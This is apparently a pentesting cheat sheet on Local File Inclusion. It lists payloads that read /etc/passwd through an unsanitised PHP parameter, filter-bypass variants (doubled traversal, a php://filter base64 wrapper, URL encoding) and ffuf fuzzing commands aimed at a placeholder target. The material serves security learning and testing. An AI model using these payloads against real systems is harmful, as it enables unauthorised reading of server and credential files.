# Local File Inclusion

Local File Inclusion is an attack that abuses web apps by tricking the server to expose data such as server files or run scripts such as web shells. Often times they are used to exploit a vulnerable parameter such as "/index.php?display=dark" which isn't sanitized. The hacker often times will replace that parameter (in this case dark) with malicious code such as "/etc/passwd" which will dump the contents of that file onto the webpage.

## Basics

```
/index.php?mode=/etc/passwd			# no path traversal
/index.php?mode=/../../../etc/passwd		# with path traversal and name prefix
/index.php?mode=./mode../../../../etc/passwd	# path traversal and approved path
```

## Bypasses

In order to evade common sanitization techniques, we can wrangle our LFI to slip past them.

```
/index.php?mode=....//....//....//etc/passwd						# bypassing path traversal filters
/index.php?mode=php://filter/read=convert.base64-encode/resource=config			# bypassing by using PHP with a base64 filter
/index.php?mode=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64	# bypassing filters using URL encoding 
```

## Automation

Using Ffuf, we can easily automate the process of LFI. There are many LFI wordlists, but we can use some of SecLists wordlists to help.

### Fuzzing Parameters

For recon, we can fuzz the page's parameters to figure out which one we can exploit.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<TARGET_IP>:<TARGET_PORT>/index.php?FUZZ=test' -fs <BYTES>
```

### Fuzzing Potential LFI Exploits

```
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET_IP>:<TARGET_PORT>/index.php?mode=FUZZ' -fs <BYTES>
```
